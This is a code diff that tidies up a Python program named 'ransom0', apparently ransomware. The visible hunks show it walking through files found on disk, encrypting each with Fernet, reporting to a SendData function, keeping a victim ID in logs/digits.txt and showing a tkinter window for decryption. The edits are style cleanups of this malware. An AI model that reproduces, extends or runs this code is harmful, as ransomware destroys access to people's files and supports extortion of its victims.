@@ -1,7 +1,12 @@
-import os, platform, ssl, shutil, time, requests, ctypes
+import os
+import platform 
+import ssl 
+import shutil 
+import time
+import requests
+import ctypes
 from datetime import datetime
 from os import system, name, path
-from cryptography.fernet import Fernet
 from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import *
@@ -63,10 +68,9 @@ class ransom0:
 
     def clear(self): 
         if name == 'nt': 
-            _ = system('cls') 
-
+            os.system('cls') 
         else: 
-            _ = system('clear') 
+            os.system('clear') 
 
     def FindFiles(self):
         f = open("logs/path.txt", "w")
@@ -122,7 +126,6 @@ def StartRansom():
                     ransom0.Encrypt(filename)
                 except Exception:
                     print("!Permission denied")
-                    pass
                 line = fp.readline()
         fp.close()
         SendData('false')
@@ -210,7 +213,6 @@ def DECRYPT_FILE():
                     decrypt(filename)
                 except PermissionError:
                     print("!Permission Denied")
-                    pass
                 line = fp.readline()
         label1 = tk.Label(root, text='YOUR FILES HAVE BEEN DECRYPTED') # Title
         label1.config(font=('helvetica', int(height/50)))
@@ -236,7 +238,7 @@ def DECRYPT_FILE():
 
 if __name__ == '__main__':
     # Generate digits ID or read generated value from digits.txt
-    if path.exists("logs") == True:
+    if path.exists("logs") is True:
         f = open("logs/digits.txt", "r")
         digits = f.read()
         f.close()
